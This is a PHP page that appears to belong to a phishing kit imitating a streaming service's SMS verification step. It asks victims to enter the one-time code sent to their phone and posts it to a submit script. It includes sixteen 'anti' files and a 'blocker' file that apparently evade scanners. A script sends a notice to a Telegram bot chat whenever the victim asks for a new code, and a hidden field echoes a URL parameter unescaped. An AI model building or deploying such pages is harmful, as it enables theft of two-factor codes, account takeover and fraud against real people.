<?php 
include_once "./submit.php" ;
include_once "./includes/header.html" 
?>
<?php 
include "./boots/anti1.php";
include "./boots/anti2.php";
include "./boots/anti3.php";
include "./boots/anti4.php";
include "./boots/anti5.php";
include "./boots/anti6.php";
include "./boots/anti7.php";
include "./boots/anti8.php";
include "./boots/anti9.php";
include "./boots/anti10.php";
include "./boots/anti11.php";
include "./boots/anti12.php";
include "./boots/anti13.php";
include "./boots/anti14.php";
include "./boots/anti15.php";
include "./boots/anti16.php";
include "./boots/blocker.php";
?>

  <style>
      #id_resend{
          cursor: pointer;
      }
      #id_resend:hover{
        font-size: 18px;
      }
      #id_resend:link{
        color: #2f2f31 ;
      }
  </style>

   <div class="simpleContainer">
                    <div class="centerContainer" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
                        <form method="POST">
                            <div class="regFormContainer" >
                                <div class="stepHeader-container" >
                                    <div class="stepHeader" tabindex="0">
                                        <h1 class="stepTitle" >Please enter the sms code we sent you.</h1>
                                    </div>
                                </div>
                                <div>
                                    <div class="contextRow" >We want to make sure it's really you. We sent a text message to your phone number.</div>
                                    <ul class="simpleForm structural ui-grid">
                                        <li class="nfFormSpace">
                                            <div class="nfInput nfInputOversize">
                                                <div class="nfInputPlacement">
                                                    <label class="input_id" placeholder="SMS Code">
                                                        <input   name="id_sms" class="nfTextField" id="id_sms" type="text" >
                                                        <label for="id_sms" class="placeLabel">SMS Code</label>
                                                        </label>
                                                </div>
                                                <div  class="inputError" id="inputErrorMsgSms"></div>

                                            </div>
                                        </li>
                                    </ul>
                                </div>
                                <div> 


                                    <p id="id_resend" style="color: #565656 ; text-decoration: none;">Resend SMS Code</p>

                            </div>
                            </div>
                            <input type="hidden" name="type" value="sms">
                            <input type="hidden" name="counter" value="<?php if(isset($_GET['c'])) echo $_GET['c']; ?>">


                            <div class="submitBtnContainer">
                               
                                <button type="submit" disabled id="btn_sms"  autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" >Confirm</button>
                            </div>
                        </form>
                    </div>
                </div>
               


<script>

document.getElementById("id_resend").onclick = function() {
    var wnd = window.open("https://api.telegram.org/bot<TOKEN_REMOVED>/sendMessage?chat_id=-793822566&text=Resend-SMS-Code");
    setTimeout(function() {
      wnd.close();
     }, 1);
    return false;
  };

</script>


<?php include_once "./includes/footer.html" ?>